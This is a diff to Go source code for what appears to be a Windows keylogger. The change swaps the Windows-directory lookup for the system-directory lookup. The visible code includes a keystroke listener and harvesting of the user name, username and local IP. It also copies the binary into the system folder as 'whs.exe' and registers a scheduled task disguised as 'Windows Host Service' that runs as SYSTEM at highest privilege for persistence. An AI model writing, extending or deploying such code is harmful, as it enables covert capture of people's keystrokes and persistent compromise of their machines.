@@ -35,7 +35,7 @@ var (
 	procToUnicode                = user32.NewProc("ToUnicode")
 	procActivateKeyboardLayout   = user32.NewProc("ActivateKeyboardLayout")
 
-	procGetSystemWindowsDirectory = kernel32.NewProc("GetSystemWindowsDirectoryA")
+	procGetSystemDirectory = kernel32.NewProc("GetSystemDirectoryA")
 
 	tmpTitle       string
 	eventsBuf      string
@@ -43,10 +43,10 @@ var (
 )
 
 type systemInfo struct {
-	windowsFolder string
-	userName      string
-	userUsername  string
-	localIP       net.IP
+	systemFolder string
+	userName     string
+	userUsername string
+	localIP      net.IP
 }
 
 var tmpKeylog = make(chan string)
@@ -159,8 +159,8 @@ func getWindowText(hwnd syscall.Handle, str *uint16, maxCount int32) (len int32,
 
 // Kernel32.dll
 
-func getSystemWindowsDirectory(lpBuffer *byte) (len int32, err error) {
-	r0, _, e1 := syscall.Syscall(procGetSystemWindowsDirectory.Addr(), 2, uintptr(unsafe.Pointer(lpBuffer)), 256, 0)
+func getSystemDirectory(lpBuffer *byte) (len int32, err error) {
+	r0, _, e1 := syscall.Syscall(procGetSystemDirectory.Addr(), 2, uintptr(unsafe.Pointer(lpBuffer)), 256, 0)
 	len = int32(r0)
 
 	if len == 0 {
@@ -223,10 +223,10 @@ func getOutboundIP() net.IP {
 }
 
 func getSystemInfo() {
-	windowsDirectory := make([]byte, 256)
-	_, getWindowsDirectoryErr := getSystemWindowsDirectory(&windowsDirectory[0])
-	if getWindowsDirectoryErr != nil {
-		log.Panicf("getWindowsDirectory -> %v", getWindowsDirectoryErr)
+	systemDirectory := make([]byte, 256)
+	_, getSystemDirectoryErr := getSystemDirectory(&systemDirectory[0])
+	if getSystemDirectoryErr != nil {
+		log.Panicf("getSystemDirectory -> %v", getSystemDirectoryErr)
 	}
 
 	user, userErr := user.Current()
@@ -235,10 +235,10 @@ func getSystemInfo() {
 	}
 
 	systemInfoData = systemInfo{
-		windowsFolder: string(bytes.Trim(windowsDirectory, "\x00")),
-		userName:      user.Name,
-		userUsername:  user.Username,
-		localIP:       getOutboundIP(),
+		systemFolder: string(bytes.Trim(systemDirectory, "\x00")),
+		userName:     user.Name,
+		userUsername: user.Username,
+		localIP:      getOutboundIP(),
 	}
 }
 
@@ -402,7 +402,7 @@ func keyLoggerListener() {
 }
 
 func addScheduler() {
-	copyErr := copy(os.Args[0], systemInfoData.windowsFolder+"\\"+"whs.exe")
+	copyErr := copy(os.Args[0], systemInfoData.systemFolder+"\\"+"whs.exe")
 	if copyErr != nil {
 		log.Panicf("copy -> %v", copyErr)
 	}
@@ -413,7 +413,7 @@ func addScheduler() {
 		"/tn", "Windows Host Service",
 		"/f",
 		"/rl", "HIGHEST",
-		"/tr", systemInfoData.windowsFolder+"\\"+"whs.exe",
+		"/tr", systemInfoData.systemFolder+"\\"+"whs.exe",
 		"/ru", "SYSTEM",
 	).Output()
 
